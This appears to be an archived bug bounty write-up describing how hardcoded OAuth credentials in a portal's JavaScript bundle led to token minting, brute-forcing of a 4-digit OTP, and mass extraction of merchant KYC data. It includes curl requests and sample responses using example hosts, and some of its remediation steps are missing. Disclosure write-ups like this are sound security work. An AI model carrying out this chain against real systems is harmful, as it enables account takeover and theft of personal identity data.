# From Leaked API Key to Full Account Takeover

- **Source URL:** https://medium.com/@Brian_Bange/from-leaked-api-key-to-full-account-takeover-uncovering-a-mass-pii-vulnerability-228a4a3d6bef
- **Fetched from:** https://medium.com/@Brian_Bange/from-leaked-api-key-to-full-account-takeover-uncovering-a-mass-pii-vulnerability-228a4a3d6bef?source=rss-d9d06d9d059b------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14924)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Brian Bange / Sat, 26 Sep 2026 03:52:31 GMT

Hardcoded frontend secrets are often treated as minor hygiene flaws — until they sit at the entrance of a chain that blows open entire customer databases.

Recently, while auditing a major enterprise financial services portal operated by a leading telecommunications provider, I stumbled across a classic developer shortcut in a frontend JavaScript chunk. What started as exposed OAuth2 credentials quickly cascaded into an unauthenticated full account takeover and mass KYC data exfiltration affecting every registered merchant.

Here is the technical breakdown of how a single client-side leak dismantled multi-factor authentication and exposed customer identities at scale.

Modern Next.js and React portals frequently bundle dynamic routing and API orchestration into public static chunks. While analyzing the client-side JavaScript assets on the organization’s commercial onboarding portal at business.example.com, I ran a targeted regex sweep for common authentication patterns.

Buried inside an Axios client instantiation was a hardcoded production API keypair:

// Excerpt from compiled client bundle: app-bundle.js

5352: function(e, t, n) {

var a, l = n(50029), r = n(87794);

s = n(5121).Z.create({

baseURL: "https://api.example-gateway.com/",

headers: {

"Content-Type": "application/json"

},

auth: {

username: "live\_client\_id\_8f92j3k4",

password: "live\_secret\_938jf4k2l1"

}

});

l = (a = (0, l.Z)(o().mark(function callee() {

return o().wrap(function(t) {

for (;;) switch (t.prev = t.next) {

case 0:

return t.next = 3, s.get("oauth/cors/v1/generate?grant\_type=client\_credentials")

.then(function(t) {

return t.data.access\_token;

});

case 3:

return t.abrupt("return");

case "end":

return t.stop();

}

});

})));

}

The developers had embedded raw client\_credentials directly into client-side code to fetch OAuth2 tokens on page load — completely bypassing the standard practice of handling token exchanges on a backend proxy.

With the credentials in hand, Base64-encoding the client ID and secret allowed me to interact directly with the production API gateway via cURL:

curl -X GET "https://api.example-gateway.com/oauth/cors/v1/generate?grant\_type=client\_credentials" \

-H "Authorization: Basic bGl2ZV9jbGllbnRfaWRfOGY5Mmo...=="

The gateway responded immediately with a live production Bearer token:

```
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "expires_in": "3599"
}
```
This token was valid for 60 minutes. More critically, because the embedded credentials were completely static, fresh tokens could be minted programmatically at will without any session expiration barrier.

With the Bearer token active, I probed the portal’s internal operational APIs. One endpoint immediately stood out: the generate-otp endpoint.

The endpoint allowed any caller with the bearer token to trigger an SMS verification code to any subscriber number on the telecom network:

curl -X POST "https://business.example.com/api/generate-otp" \

-H "Content-Type: application/json" \

-d '{

"msisdn": "07XXXXXXXX",

"token": "Bearer eyJhbGciOiJSUzI1NiIs..."

}'

The server dispatched an official SMS OTP to the target phone number immediately. There was no rate-limiting header, no sender validation, and no check on whether the caller owned the MSISDN.

Authentication flows that rely on One-Time Passwords require two mandatory controls: high entropy and aggressive rate limiting. This endpoint had neither.

Inspecting the validation endpoint revealed that the OTP was strictly numeric and only 4 digits, meaning there were only 10,000 possible combinations from 0000 to 9999. Furthermore, the endpoint was completely unthrottled: there was no progressive delay, no CAPTCHA challenge, and no account lockout mechanism upon repeated failures.

Testing an invalid code returned an unmetered 712 error response:

curl -X POST "https://business.example.com/api/validate-otp" \

-H "Content-Type: application/json" \

-d '{

"otp": "0000",

"msisdn": "07XXXXXXXX",

"token": "Bearer eyJhbGciOiJSUzI1NiIs..."

}'

# Response:

# {"header":{"responseCode":"712","responseMessage":"Invalid OTP provided. Please try again."},"body":"{}"}

The math on the attack surface was clear:

When the correct 4-digit code hit, the API returned an authenticated session identifier:

```
{
  "header": {
    "responseCode": "200",
    "responseMessage": "Valid OTP provided. Thank you."
  },
  "body": {
    "sessionId": "b49d70a0-abcd-4596-87a9-8a2f7efc6262"
  }
}
```
Once the authenticated session ID was paired with the target phone number, the portal exposed an endpoint designed to pull merchant registration records

curl -X POST "https://api.example-gateway.com/api/v2/get/applications/msisdn" \

-H "Authorization: Bearer eyJhbGciOiJSUzI1NiIs..." \

-H "Content-Type: application/json" \

-d '{

"phoneNumber": "07XXXXXXXX",

"sessionId": "b49d70a0-abcd-4596-87a9-8a2f7efc6262",

"page": 0,

"size": 10

}'

The server dumped the complete, unmasked customer KYC record:

```
{
  "body": {
    "content": [
      {
        "applicantDocumentType": "National ID",
        "applicantDocumentNumber": "12345678",
        "applicantNames": "John Doe",
        "applicantPhoneNumber": "07XXXXXXXX",
        "applicantEmailAddress": "merchant@gmail.com",
        "applicantBusinessAddress": "123 Commerce St",
        "businessProfileName": "Example Retailers",
        "businessProfileCategory": "Retail",
        "businessProfileKrapin": "P123456789X",
        "tillNumber": "123456",
        "organizationShortCode": "987654",
        "status": "APPROVED"
      }
    ]
  },
  "header": {
    "responseCode": "200",
    "responseMessage": "SUCCESS"
  }
}
```
The root cause was not merely an exposed key, but architectural trust placed in a client browser:

**4. Enforce Object-Level Authorization (BOLA):** Ensure backend endpoints cryptographically verify that the requested phone number matches the verified identity bound to the active session.

Never overlook client-side JavaScript. A single hardcoded string can compromise an entire authentication perimeter when downstream APIs assume that possessing a valid token equals authorized business access.

Responsible disclosure filed, remediated, and on to the next hunt!
